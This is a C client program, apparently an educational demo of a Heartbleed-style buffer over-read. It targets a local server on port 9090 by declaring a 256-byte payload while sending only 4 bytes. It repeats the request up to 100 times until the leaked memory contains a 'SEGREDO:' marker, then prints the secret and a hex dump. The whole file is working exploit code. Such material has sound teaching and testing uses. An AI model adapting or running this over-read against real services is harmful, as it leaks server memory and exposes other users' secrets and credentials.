#include <arpa/inet.h>
#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 9090
#define DECLARED_SIZE 256
#define MAX_ATTEMPTS 100

/*
 * O atacante conhece apenas um marcador generico,
 * nao o conteudo completo armazenado pelo servidor.
 */
#define SECRET_MARKER "SEGREDO:"

static void fail(const char *message) {
    perror(message);
    exit(EXIT_FAILURE);
}

static ssize_t send_all(int socket_fd, const void *buffer, size_t size) {
    size_t sent = 0;

    while (sent < size) {
        ssize_t result = send(
            socket_fd,
            (const char *)buffer + sent,
            size - sent,
            0
        );

        if (result <= 0) {
            return result;
        }

        sent += (size_t)result;
    }

    return (ssize_t)sent;
}

static ssize_t receive_all(int socket_fd, void *buffer, size_t size) {
    size_t received = 0;

    while (received < size) {
        ssize_t result = recv(
            socket_fd,
            (char *)buffer + received,
            size - received,
            0
        );

        if (result <= 0) {
            return result;
        }

        received += (size_t)result;
    }

    return (ssize_t)received;
}

static ssize_t find_marker(
    const unsigned char *buffer,
    size_t buffer_size,
    const char *marker
) {
    size_t marker_size = strlen(marker);

    if (marker_size > buffer_size) {
        return -1;
    }

    for (size_t i = 0; i <= buffer_size - marker_size; i++) {
        if (memcmp(buffer + i, marker, marker_size) == 0) {
            return (ssize_t)i;
        }
    }

    return -1;
}

static void print_memory(const unsigned char *buffer, size_t size) {
    printf("\nConteudo vazado em hexadecimal:\n");

    for (size_t i = 0; i < size; i++) {
        printf("%02x ", buffer[i]);

        if ((i + 1) % 16 == 0) {
            printf("\n");
        }
    }

    printf("\nRepresentacao textual:\n");

    for (size_t i = 0; i < size; i++) {
        putchar(isprint(buffer[i]) ? buffer[i] : '.');
    }

    printf("\n");
}

static void print_leaked_secret(
    const unsigned char *buffer,
    size_t buffer_size,
    size_t start
) {
    printf("Conteudo descoberto: ");

    for (size_t i = start; i < buffer_size; i++) {
        if (buffer[i] == '\0') {
            break;
        }

        if (isprint(buffer[i])) {
            putchar(buffer[i]);
        } else {
            break;
        }
    }

    printf("\n");
}

static int connect_to_server(void) {
    int socket_fd = socket(AF_INET, SOCK_STREAM, 0);

    if (socket_fd == -1) {
        fail("Erro ao criar o socket");
    }

    struct sockaddr_in server_address = {0};

    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(SERVER_PORT);

    if (inet_pton(AF_INET, SERVER_IP, &server_address.sin_addr) != 1) {
        close(socket_fd);
        fprintf(stderr, "Endereco do servidor invalido.\n");
        exit(EXIT_FAILURE);
    }

    if (connect(
            socket_fd,
            (struct sockaddr *)&server_address,
            sizeof(server_address)
        ) == -1) {
        close(socket_fd);
        fail("Erro ao conectar ao servidor");
    }

    return socket_fd;
}

static ssize_t execute_attempt(unsigned char *response) {
    const char payload[] = "PING";

    uint16_t payload_size = (uint16_t)strlen(payload);
    uint16_t declared_size_network = htons(DECLARED_SIZE);
    uint16_t payload_size_network = htons(payload_size);

    int socket_fd = connect_to_server();

    if (send_all(
            socket_fd,
            &declared_size_network,
            sizeof(declared_size_network)
        ) != sizeof(declared_size_network)) {
        close(socket_fd);
        fail("Erro ao enviar o tamanho declarado");
    }

    if (send_all(
            socket_fd,
            &payload_size_network,
            sizeof(payload_size_network)
        ) != sizeof(payload_size_network)) {
        close(socket_fd);
        fail("Erro ao enviar o tamanho real");
    }

    if (send_all(socket_fd, payload, payload_size) != payload_size) {
        close(socket_fd);
        fail("Erro ao enviar o payload");
    }

    if (receive_all(socket_fd, response, DECLARED_SIZE) != DECLARED_SIZE) {
        close(socket_fd);
        fail("Erro ao receber a resposta");
    }

    close(socket_fd);

    return find_marker(response, DECLARED_SIZE, SECRET_MARKER);
}

int main(void) {
    unsigned char *response = malloc(DECLARED_SIZE);

    if (response == NULL) {
        fail("Erro ao alocar a resposta");
    }

    for (int attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
        printf("Tentativa %d de %d...\n", attempt, MAX_ATTEMPTS);

        ssize_t marker_position = execute_attempt(response);

        if (marker_position >= 0) {
            printf("\nMarcador de dado sensivel encontrado na tentativa %d!\n", attempt);

            print_leaked_secret(
                response,
                DECLARED_SIZE,
                (size_t)marker_position
            );

            print_memory(response, DECLARED_SIZE);

            free(response);
            return EXIT_SUCCESS;
        }

        printf("Nenhum dado sensivel identificado nesta resposta.\n");
    }

    printf("\nLimite de tentativas atingido sem encontrar o segredo.\n");

    free(response);

    return EXIT_FAILURE;
}